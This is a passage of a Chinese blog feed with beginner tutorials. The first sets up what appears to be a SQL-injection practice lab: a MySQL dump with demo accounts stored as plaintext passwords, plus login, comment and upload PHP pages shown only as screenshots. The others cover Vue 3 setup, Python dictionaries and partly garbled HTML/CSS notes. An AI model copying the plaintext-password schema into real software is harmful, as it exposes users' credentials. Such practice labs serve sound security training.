<p>输入以下代码：</p>
<p>&#x2F;*<br> Navicat Premium Data Transfer</p>
<p> Source Server         : 1<br> Source Server Type    : MySQL<br> Source Server Version : 50741<br> Source Host           : localhost:3306<br> Source Schema         : security</p>
<p> Target Server Type    : MySQL<br> Target Server Version : 50741<br> File Encoding         : 65001</p>
<p> Date: 12&#x2F;12&#x2F;2023 15:44:36<br>*&#x2F;</p>
<p>SET NAMES utf8mb4;<br>SET FOREIGN_KEY_CHECKS &#x3D; 0;</p>
<hr>
<p>– Table structure for emails</p>
<hr>
<p>DROP TABLE IF EXISTS <code>emails</code>;<br>CREATE TABLE <code>emails</code>  (<br>  <code>id</code> int(3) NOT NULL AUTO_INCREMENT,<br>  <code>email_id</code> varchar(30) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,<br>  PRIMARY KEY (<code>id</code>) USING BTREE<br>) ENGINE &#x3D; InnoDB AUTO_INCREMENT &#x3D; 9 CHARACTER SET &#x3D; gbk COLLATE &#x3D; gbk_chinese_ci ROW_FORMAT &#x3D; Dynamic;</p>
<hr>
<p>– Records of emails</p>
<hr>
<p>INSERT INTO <code>emails</code> VALUES (1, ‘<span class="exturl"><a class="exturl__link"   href="mailto:&#68;&#x75;&#109;&#98;&#64;&#x64;&#x68;&#97;&#x6b;&#107;&#x61;&#110;&#46;&#x63;&#111;&#109;" >&#68;&#x75;&#109;&#98;&#64;&#x64;&#x68;&#97;&#x6b;&#107;&#x61;&#110;&#46;&#x63;&#111;&#109;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>‘);<br>INSERT INTO <code>emails</code> VALUES (2, ‘<span class="exturl"><a class="exturl__link"   href="mailto:&#x41;&#x6e;&#103;&#x65;&#108;&#x40;&#x69;&#108;&#111;&#118;&#101;&#117;&#x2e;&#99;&#111;&#x6d;" >&#x41;&#x6e;&#103;&#x65;&#108;&#x40;&#x69;&#108;&#111;&#118;&#101;&#117;&#x2e;&#99;&#111;&#x6d;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>‘);<br>INSERT INTO <code>emails</code> VALUES (3, ‘<span class="exturl"><a class="exturl__link"   href="mailto:&#68;&#x75;&#x6d;&#x6d;&#x79;&#64;&#x64;&#x68;&#x61;&#x6b;&#x6b;&#x61;&#x6e;&#x2e;&#x6c;&#111;&#99;&#x61;&#108;" >&#68;&#x75;&#x6d;&#x6d;&#x79;&#64;&#x64;&#x68;&#x61;&#x6b;&#x6b;&#x61;&#x6e;&#x2e;&#x6c;&#111;&#99;&#x61;&#108;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>‘);<br>INSERT INTO <code>emails</code> VALUES (4, ‘<span class="exturl"><a class="exturl__link"   href="mailto:&#x73;&#101;&#99;&#x75;&#114;&#x65;&#x40;&#100;&#104;&#97;&#x6b;&#x6b;&#x61;&#110;&#46;&#x6c;&#x6f;&#99;&#97;&#108;" >&#x73;&#101;&#99;&#x75;&#114;&#x65;&#x40;&#100;&#104;&#97;&#x6b;&#x6b;&#x61;&#110;&#46;&#x6c;&#x6f;&#99;&#97;&#108;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>‘);<br>INSERT INTO <code>emails</code> VALUES (5, ‘<span class="exturl"><a class="exturl__link"   href="mailto:&#115;&#116;&#x75;&#x70;&#105;&#x64;&#64;&#x64;&#104;&#97;&#107;&#x6b;&#97;&#x6e;&#46;&#x6c;&#111;&#99;&#x61;&#108;" >&#115;&#116;&#x75;&#x70;&#105;&#x64;&#64;&#x64;&#104;&#97;&#107;&#x6b;&#97;&#x6e;&#46;&#x6c;&#111;&#99;&#x61;&#108;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>‘);<br>INSERT INTO <code>emails</code> VALUES (6, ‘<span class="exturl"><a class="exturl__link"   href="mailto:&#115;&#x75;&#x70;&#x65;&#x72;&#109;&#x61;&#110;&#64;&#x64;&#104;&#x61;&#107;&#x6b;&#97;&#110;&#x2e;&#108;&#111;&#99;&#x61;&#108;" >&#115;&#x75;&#x70;&#x65;&#x72;&#109;&#x61;&#110;&#64;&#x64;&#104;&#x61;&#107;&#x6b;&#97;&#110;&#x2e;&#108;&#111;&#99;&#x61;&#108;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>‘);<br>INSERT INTO <code>emails</code> VALUES (7, ‘<span class="exturl"><a class="exturl__link"   href="mailto:&#98;&#x61;&#116;&#109;&#x61;&#110;&#x40;&#x64;&#x68;&#x61;&#x6b;&#x6b;&#97;&#110;&#x2e;&#108;&#111;&#x63;&#x61;&#108;" >&#98;&#x61;&#116;&#109;&#x61;&#110;&#x40;&#x64;&#x68;&#x61;&#x6b;&#x6b;&#97;&#110;&#x2e;&#108;&#111;&#x63;&#x61;&#108;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>‘);<br>INSERT INTO <code>emails</code> VALUES (8, ‘<span class="exturl"><a class="exturl__link"   href="mailto:&#97;&#x64;&#x6d;&#105;&#x6e;&#x40;&#x64;&#x68;&#97;&#x6b;&#x6b;&#97;&#110;&#46;&#99;&#111;&#109;" >&#97;&#x64;&#x6d;&#105;&#x6e;&#x40;&#x64;&#x68;&#97;&#x6b;&#x6b;&#97;&#110;&#46;&#99;&#111;&#109;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>‘);</p>
<hr>
<p>– Table structure for referers</p>
<hr>
<p>DROP TABLE IF EXISTS <code>referers</code>;<br>CREATE TABLE <code>referers</code>  (<br>  <code>id</code> int(3) NOT NULL AUTO_INCREMENT,<br>  <code>referer</code> varchar(256) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,<br>  <code>ip_address</code> varchar(35) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,<br>  PRIMARY KEY (<code>id</code>) USING BTREE<br>) ENGINE &#x3D; InnoDB AUTO_INCREMENT &#x3D; 1 CHARACTER SET &#x3D; gbk COLLATE &#x3D; gbk_chinese_ci ROW_FORMAT &#x3D; Dynamic;</p>
<hr>
<p>– Table structure for uagents</p>
<hr>
<p>DROP TABLE IF EXISTS <code>uagents</code>;<br>CREATE TABLE <code>uagents</code>  (<br>  <code>id</code> int(3) NOT NULL AUTO_INCREMENT,<br>  <code>uagent</code> varchar(256) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,<br>  <code>ip_address</code> varchar(35) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,<br>  <code>username</code> varchar(20) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,<br>  PRIMARY KEY (<code>id</code>) USING BTREE<br>) ENGINE &#x3D; InnoDB AUTO_INCREMENT &#x3D; 1 CHARACTER SET &#x3D; gbk COLLATE &#x3D; gbk_chinese_ci ROW_FORMAT &#x3D; Dynamic;</p>
<hr>
<p>– Table structure for users</p>
<hr>
<p>DROP TABLE IF EXISTS <code>users</code>;<br>CREATE TABLE <code>users</code>  (<br>  <code>id</code> int(3) NOT NULL AUTO_INCREMENT,<br>  <code>username</code> varchar(20) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,<br>  <code>password</code> varchar(20) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,<br>  PRIMARY KEY (<code>id</code>) USING BTREE<br>) ENGINE &#x3D; InnoDB AUTO_INCREMENT &#x3D; 15 CHARACTER SET &#x3D; gbk COLLATE &#x3D; gbk_chinese_ci ROW_FORMAT &#x3D; Dynamic;</p>
<hr>
<p>– Records of users</p>
<hr>
<p>INSERT INTO <code>users</code> VALUES (1, ‘Dumb’, ‘Dumb’);<br>INSERT INTO <code>users</code> VALUES (2, ‘Angelina’, ‘I-kill-you’);<br>INSERT INTO <code>users</code> VALUES (3, ‘Dummy’, ‘p@ssword’);<br>INSERT INTO <code>users</code> VALUES (4, ‘secure’, ‘crappy’);<br>INSERT INTO <code>users</code> VALUES (5, ‘stupid’, ‘stupidity’);<br>INSERT INTO <code>users</code> VALUES (6, ‘superman’, ‘genious’);<br>INSERT INTO <code>users</code> VALUES (7, ‘batman’, ‘mob!le’);<br>INSERT INTO <code>users</code> VALUES (8, ‘admin’, ‘admin’);<br>INSERT INTO <code>users</code> VALUES (9, ‘admin1’, ‘admin1’);<br>INSERT INTO <code>users</code> VALUES (10, ‘admin2’, ‘admin2’);<br>INSERT INTO <code>users</code> VALUES (11, ‘admin3’, ‘admin3’);<br>INSERT INTO <code>users</code> VALUES (12, ‘dhakkan’, ‘dumbo’);<br>INSERT INTO <code>users</code> VALUES (14, ‘admin4’, ‘admin4’);</p>
<p>SET FOREIGN_KEY_CHECKS &#x3D; 1;</p>
<p>并运行</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212205054877.png" alt="image-20231212205054877"></p>
<p>成功会有几个数据表</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212205148156.png" alt="image-20231212205148156"></p>
<p>6.在PHP study打开网站</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212205319779.png" alt="image-20231212205319779"></p>
<p>运行效果，输入表里面有点用户内容会跳转页面并有你输入是用户名，密码</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212205455630.png" alt="image-20231212205455630"></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212205514607.png" alt="image-20231212205514607"></p>
<p>7.新建一个zhuye.php文件实现主页注销登录功能代码如下</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213193715262.png" alt="image-20231213193715262"></p>
<p>8.重新进行登录成功后进入运行效果如下，点击注销会立马返回登录页面</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213193809697.png" alt="image-20231213193809697"></p>
<p>9.增加实现一个评论区页面功能，新建一个comment.php页面代码如下</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213194244959.png" alt="image-20231213194244959"></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213194308902.png" alt="image-20231213194308902"></p>
<p>10.进入127.0.0.1&#x2F;comment.php页面成功实现评论功能效果</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213194516122.png" alt="image-20231213194516122"></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213194539713.png" alt="image-20231213194539713"></p>
<p>11.增加实现一个上传文件功能的页面，新建一个upload.php页面代码如下</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213194834994.png" alt="image-20231213194834994"></p>
<p>12.进入127.0.0.1&#x2F;upload.php页面成功实现上传文件功能效果</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213195106958.png" alt="image-20231213195106958"></p>
<p>13.将评论区功能和上传文件功能都集成给主页，需要给zhuye.php增加代码如下</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213195421451.png" alt="image-20231213195421451"></p>
<p>14.成功给登录成功后主页增加实现评论和上传文件功能</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213195701712.png" alt="image-20231213195701712"></p>
]]></content>
  </entry>
  <entry>
    <title>Vue3</title>
    <url>/2023/12/11/text13/</url>
    <content><![CDATA[
        <h1 id="1-安装-Node-js-和-npm"   >
          <a href="#1-安装-Node-js-和-npm" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-安装-Node-js-和-npm" class="headerlink" title="1. 安装 Node.js 和 npm"></a>1. 安装 Node.js 和 npm</h1>
      <p>Vue 3 需要使用 Node.js 和 npm（Node 包管理器）进行开发。你可以从 <span class="exturl"><a class="exturl__link"   href="https://nodejs.org/" >Node.js 官网</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 下载并安装 Node.js，它自带了 npm。</p>

        <h1 id="2-创建Vue3项目"   >
          <a href="#2-创建Vue3项目" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-创建Vue3项目" class="headerlink" title="2. 创建Vue3项目"></a>2. 创建Vue3项目</h1>
      <p>打开cmd输入：npm create vue@latest</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231211203303662.png" alt="image-20231211203303662"></p>
<p>在这个过程中，你会被要求选择一些配置选项，也可以全部否。</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231211203505764.png" alt="image-20231211203505764"></p>

        <h1 id="3-运行-Vue-3-项目"   >
          <a href="#3-运行-Vue-3-项目" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-运行-Vue-3-项目" class="headerlink" title="3. 运行 Vue 3 项目"></a>3. 运行 Vue 3 项目</h1>
      <p>进入项目目录：cd my-vue3-project</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231211203648100.png" alt="image-20231211203648100"></p>
<p>安装element-plus服务：npm install element-plus –save<br>                                          npm install -D unplugin-vue-components unplugin-auto-import</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231211204258171.png" alt="image-20231211204258171"></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231211204357218.png" alt="image-20231211204357218"></p>
<p>然后运行项目：npm run dev</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231211204442485.png" alt="image-20231211204442485"></p>
<p>这将启动一个开发服务器，并在浏览器中打开项目。你会看到一个页面，表示 Vue 3 项目已经成功运行。<img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231211204521686.png" alt="image-20231211204521686"></p>

        <h1 id="4-项目结构"   >
          <a href="#4-项目结构" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-项目结构" class="headerlink" title="4. 项目结构"></a>4. 项目结构</h1>
      <p>Vue 3 项目的主要目录结构：</p>
<ul>
<li><code>src</code>: 包含项目的源代码</li>
<li><code>public</code>: 静态资源文件，不经过 Webpack 处理</li>
<li><code>node_modules</code>: 存放项目依赖的 npm 模块</li>
<li><code>public/index.html</code>: 项目的入口 HTML 文件</li>
<li><code>src/main.js</code>: 项目的入口 JavaScript 文件</li>
<li><code>src/App.vue</code>: 根组件文件</li>
<li><code>src/components</code>: 存放 Vue 组件的目录</li>
<li><code>src/assets</code>: 存放静态资源如图片、样式文件等</li>
<li><code>src/views</code>: 存放视图组件的目录</li>
</ul>

        <h1 id="5-在main-js中导入内容"   >
          <a href="#5-在main-js中导入内容" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-在main-js中导入内容" class="headerlink" title="5.在main.js中导入内容"></a>5.在main.js中导入内容</h1>
      <p>import { createApp } from ‘vue’<br>import App from ‘.&#x2F;App.vue’<br>import ElementPlus from ‘element-plus’;<br>import ‘element-plus&#x2F;dist&#x2F;index.css’</p>
<p>createApp(App).mount(‘#app’)</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231211210145215.png" alt="image-20231211210145215"></p>

        <h1 id="6-vue简单编辑使用"   >
          <a href="#6-vue简单编辑使用" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-vue简单编辑使用" class="headerlink" title="6.vue简单编辑使用"></a>6.vue简单编辑使用</h1>
      <p>vue页面主要组成</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231211210448817.png" alt="image-20231211210448817"></p>
<p>可以从<span class="exturl"><a class="exturl__link"   href="https://element-plus.org/zh-CN/component/%E4%B8%8B%E8%BD%BD%E4%BD%BF%E7%94%A8%E7%BB%84%E4%BB%B6" >https://element-plus.org/zh-CN/component/下载使用组件</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>一般引用如button按钮等等组件会有多个部分都需要放到对应位置</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231217094056142.png" alt="image-20231217094056142"></p>
<p>结合Container 布局容器，menu菜单侧栏，buttto按钮，switch开关等等可以写出下面</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231217092600009.png" alt="image-20231217092600009"></p>
<p>对应内容都要放到想要的容器布局里面</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231217092751646.png" alt="image-20231217092751646"></p>
]]></content>
  </entry>
  <entry>
    <title>Python字典</title>
    <url>/2023/12/07/text11/</url>
    <content><![CDATA[<p>1.字典的储存方式是以键值对的形式储存的，字典的每个键值 <strong>key&#x3D;&gt;value</strong> 对用冒号 <strong>:</strong> 分割，每个对之间用逗号(<strong>,</strong>)分割，整个字典包括在花括号 <strong>{}</strong> 中 ,格式如下所示：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="code"><pre><span class="line">d = &#123;key1 : value1, key2 : value2, key3 : value3 &#125;</span><br></pre></td></tr></table></div></figure>

<p>2.键必须是唯一的，但值则不必。值可以取任何数据类型，但键必须是不可变的，如字符串，数字。</p>
<p>3.字典的增删改查</p>
<p>（1）字典数据的增加</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210163425519.png" alt="image-20231210163425519"></p>
<p>（2）字典数据的删除</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210163802158.png" alt="image-20231210163802158"></p>
<p>循环列表删除内容</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210170315706.png" alt="image-20231210170315706"></p>
<p>（3）字典数据的查询</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210170506990.png" alt="image-20231210170506990"></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210170556795.png" alt="image-20231210170556795"></p>
<p>4.字典循环</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210171241491.png" alt="image-20231210171241491"></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210171449485.png" alt="image-20231210171449485"></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210171828192.png" alt="image-20231210171828192"></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210172043438.png" alt="image-20231210172043438"></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210172438749.png" alt="image-20231210172438749"></p>
<p>5.字典的嵌套</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210172646960.png" alt="image-20231210172646960"></p>
]]></content>
  </entry>
  <entry>
    <title>HTML5</title>
    <url>/2023/12/06/text10/</url>
    <content><![CDATA[
        <h3 id="1-文档结构"   >
          <a href="#1-文档结构" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-文档结构" class="headerlink" title="1. 文档结构"></a>1. 文档结构</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">html&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;!-- 内容在这里 --&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-常见标签"   >
          <a href="#2-常见标签" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-常见标签" class="headerlink" title="2. 常见标签"></a>2. 常见标签</h3>
      <ul>
<li><p>&lt;<div>：用于组织内容。</p>
</li>
<li><p>&lt;<p>：段落。</p>
</li>
<li><p>&lt;<h1> to <h6>：标题。</p>
</li>
<li><p>&lt;<a>：超链接。</p>
</li>
<li><p><img>：图像。</p>
</li>
<li><p>&lt;<ul>, <ol>, <li>：无序列表、有序列表、列表项。</p>
</li>
<li><p>&lt;<pre></pre>预处理</p>
<p><b>加粗</p>
<p><i>斜体</p>
<p><sup>上标如指数</p>
<p><sub>下标</p>
<p><br />换行</p>
<p>&lt;<hr />水平线</p>
<p><strong>加粗</p>
<p><em>强调表现为斜体</p>
<p>&lt;<blockquote>标记表现为缩进，将<p></p>包围在内</p>
<p><q>标记两侧引号，IE不支持</p>
<abbr>

<p><cite>引用表现为斜体，html5不可用于人名</p>
<p><dfn>定义</p>
<p>&lt;address&gt;地址<br><ins>文字带有下划线</p>
<p><del>文字带有删除线</p>
<p><s>文字中下方有横线穿过</p>
<p>&lt;<h1>—-<h6>标题由大到小</p>
<p>列表</p>
<p><o1>有序列表，中间每段用&lt;1i&gt;&lt;&#x2F;1i&gt;</p>
<p><u1>无序列表，中间每段用&lt;1i&gt;&lt;&#x2F;1i&gt;</p>
<p><d1>定义列表，首尾用<d1>，标题用<dt>，解释说明用<dd></p>
<p>链接</p>
<p>网页链接文本</p>
<p>&lt;a href＝”<span class="exturl"><a class="exturl__link"   href="http://www.baidu.com" >百度">http://www.baidu.com&quot;&gt;百度</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></a></p>
<p>email链接</p>
<p>&lt;a href ＝”mailto:<span class="exturl"><a class="exturl__link"   href="mailto:&#49;&#x32;&#x31;&#x30;&#51;&#x39;&#54;&#49;&#52;&#x32;&#64;&#x71;&#x71;&#46;&#99;&#111;&#x6d;" >&#49;&#x32;&#x31;&#x30;&#51;&#x39;&#54;&#49;&#52;&#x32;&#64;&#x71;&#x71;&#46;&#99;&#111;&#x6d;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>&gt;邮箱</a></p>
<p>在新窗口中打开链接target</p>
<p>&lt;a href&#x3D;”<span class="exturl"><a class="exturl__link"   href="http://www.baidu.com" target＝"_blank">百度">http://www.baidu.com&quot;target＝&quot;_blank&quot;&gt;百度</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></a></p>
<p>链接到其他页面的某个地方</p>
<a href ="http : / www .baidu.com/#标记符号">

<p>图像</p>
<p><img>没有结束标签，向页面添加图片。</p>
<p>src 图片地址 </p>
<p>alt 图片说明</p>
<p>title 图片简略说明</p>
<p>height以像素为单位时指定图片高度</p>
<p>width以像素为单位时指定图片宽度</p>
<img src= "" alt="" width="600" height="" /></li>
</ul>

        <h3 id="3-表单"   >
          <a href="#3-表单" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-表单" class="headerlink" title="3. 表单"></a>3. 表单</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">html&lt;form action=&quot;/submit&quot; method=&quot;post&quot;&gt;</span><br><span class="line">    &lt;label for=&quot;username&quot;&gt;用户名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;</span><br><span class="line"></span><br><span class="line">    &lt;label for=&quot;password&quot;&gt;密码：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;</span><br><span class="line"></span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></div></figure>

<p>form&#x3D;action&#x3D; &gt;&lt;&#x2F;&gt;表单结构</p>
<p>action&#x3D;”提交地址”</p>
<p>method&#x3D;”提交方式post”</p>
<p>id</p>
<p><input>表单控件</p>
<p>type&#x3D;”text”单行文本框</p>
<p>name&#x3D;”username”</p>
<p>密码框</p>
<p>maxlength限制在文本中输入的最大字符长度</p>
<p>size&#x3D;”5”老表单中显示字符数</p>
<p>type&#x3D;”password”输入的字符被掩饰</p>
<p>&lt;<textarea>&lt;&#x2F;&gt;多行文本框默认显示的内容</p>
<p>单选按钮</p>
<p>type&#x3D;”radio”让用户从一系列选项选一个</p>
<p>value&#x3D;””选项的内容</p>
<p>checked&#x3D;”checked”默认选中</p>
<p>name&#x3D;”genre”一个问题值</p>
<p>多选按钮</p>
<p>type&#x3D;”checkbox”</p>
<p>name</p>
<p>value</p>
<p>checked</p>
<p>下拉列表框</p>
<p>&lt;form action&#x3D;””&gt;<br>&lt;<select name="devices"></p>
<option value="ipod">ipod</>

<option value="ipod">ipod</>

<p>&lt;&#x2F;&gt;</p>
<p>&lt;&#x2F;&gt;</p>
<p>多选框</p>
<p>size显示多个多选框</p>
<p>multiple允许用户选择多个选项</p>
<p><input type="file">文件上传域</p>
<p><input type="submit" name="" value="">提交按钮</p>
<p><input type="image" src="图片路径" width=" " height="">图像按钮</p>
<p>&lt;<form><button>&lt;input&#x3D;”hidden”&gt;&lt;&#x2F;&gt;&lt;&#x2F;&gt;</p>
<p>required&#x3D;”名称”多个文本行添加该名称 表单验证</p>
<p>type&#x3D;”date” 日期控件</p>
<p>type&#x3D;”email” 电子邮件控件</p>
<p>type&#x3D;”url” URL输入控件</p>
<p>type&#x3D;”search placeholder&#x3D;”默认显示”” 搜索输入控件</p>
<p>flash，视频，音频</p>
<p>&lt;&lt;video src&#x3D;”xx.mp4” poster&#x3D;”显示的图片” width </p>
<p>height&#x3D;”” preload&#x3D;”auto(自动播放)&#x2F;none(电机播放)” loop结束后重新播放&gt;</p>
<p>&lt;&lt;audio src&#x3D;”音频路径” conteols是否显现播放器 autoplay自动播放&gt;</p>
<p>&lt;<audio controls autoplay><source src=""><source src=""><source src=""><p></p></audio></p>
<p>css</p>
<p>font-family字体选用</p>
<p>font-size: 像素&#x2F;百分数(100％为16px)&#x2F;EM值 字体大小</p>
<p>font-weight:bold粗体</p>
<p>font-style:italic(斜体)&#x2F;oblique(倾斜</p>
<p>text-transform:uppercase(大写)&#x2F;lowercase(小写)&#x2F;capitalize(每个单词首字母大写)</p>
<p>text-decoration:none(删除装饰线)&#x2F;overline(底部增加一条实线)&#x2F;line-through(穿过文字的一条实线)&#x2F;blink(字体闪烁)</p>
<p>line-height:1.4em 行间距</p>
<p>letter-spacing:0.2em字母间距</p>
<p>word-spacing:1em单词间距</p>
<p>text-align:left(左对齐)&#x2F;right(右对齐)&#x2F;center(居中)&#x2F;justify(两段对齐)</p>
<p>vertical-align:baseline</p>
<p>sub</p>
<p>super</p>
<p>top</p>
<p>text-top</p>
<p>middle</p>
<p>bottom</p>
<p>text-bottom</p>
<p>text-indent:20px向右缩进20像素</p>
<p>text-shadow:-1px -1px #666666 投影</p>
<p>选择器:first-letter{}首字母</p>
<p>选择器:first-line{}首行文本</p>
<p>选择器:link{} 为未被访问的链接设置样式</p>
<p>选择器:visited{} 为被访问过的链接设置样式</p>
<p>选择器:hover{} 鼠标停在按钮上改变属性</p>
<p>选择器:active{} 鼠标点击按钮后改变属性</p>
<p>选择器:focus{} 拥有焦点时改变属性</p>
<p>width:300px 盒子宽</p>
<p>height:400px 盒子高</p>
<p>min-width:450px 盒子最小自适宽</p>
<p>max-width:650pz 盒子最大自适宽</p>
<p>overflow:scroll 内容超出盒子(溢出)添加滚动滑块</p>
<p>hidden 内容溢出的部分隐藏</p>
<p>border- -width:2px</p>
<p>top&#x2F; &#x2F;right&#x2F;bottom&#x2F;left 上&#x2F;四周&#x2F;右&#x2F;下&#x2F;左</p>
<p>thin薄&#x2F;medium中等&#x2F;thick厚</p>
<p>border-style: solid &#x2F;&#x2F;&#x2F;&#x2F;&#x2F;边框样式</p>
<p>border-color: 边框颜色</p>
<p>border:3px dotted #666</p>
<p>padding:2px 内边距</p>
<p>margin:2px 外距</p>
<p>margin:20px auto 居中</p>
<p>visibility:hidden(隐藏元素) &#x2F;visible(显示元素)</p>
<p>-moz(火狐)&#x2F;webkit(谷歌&#x2F;safari浏览器)&#x2F;ms(IE)&#x2F;o(Opera浏览器)-border-image:url(“图片地址”)</p>
<p>11 11 11 11 stretch伸展图片&#x2F;repeat重复图片&#x2F;round自适重复照片 border-image边框图像</p>
<p>box-shadow: 盒子的投影</p>
<p>border-radius:10px 圆角边框</p>
<p>10px 40px 椭圆形边框</p>
<p>list-style-image:url() 项目图像</p>
<p>list-style-position: outside 标记位于文本左侧</p>
<p>inside 标记位于文本内部</p>
<p>border-spacing:5px 15px 单元格距离</p>
<p>border-collapse:collapse 单元格合并</p>
<p>font-size文本大小</p>
<p>background-color 输入框背景颜色</p>
<p>:focus 输入时</p>
<p>background-image:url(“”)背景图像</p>
<p>cursor:move 光标样式</p>
<p>crosshair</p>
<p>default</p>
<p>pointer</p>
<p>move</p>
<p>text </p>
<p>wait</p>
<p>help</p>
<p>url(“”)</p>
<p>&lt;<header></header>页眉</p>
<p>&lt;<footer></footer>页脚</p>
<p>&lt;<nav><u1><li></li><li></li><li></li></u1></nav>导航</p>
<p>&lt;<article><figure><img src="" alt=""></figure><hgroup></hgroup></article>文章</p>
<p>&lt;<aside></aside>附属信息</p>
<p>&lt;<section>&lt;&#x2F;&gt;部分</p>
<p><hgroup></group>标题组</p>
<p>&lt;<figure><img src alt><figcaption>&lt;&#x2F;&gt;</figure>图像</p>
<p>&lt;<div>&lt;&#x2F;&gt; 分节元素</p>
<p>&lt;<article><figure><img ></figure></acticle>为块元素添加链接</p>

        <h3 id="4-多媒体"   >
          <a href="#4-多媒体" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-多媒体" class="headerlink" title="4. 多媒体"></a>4. 多媒体</h3>
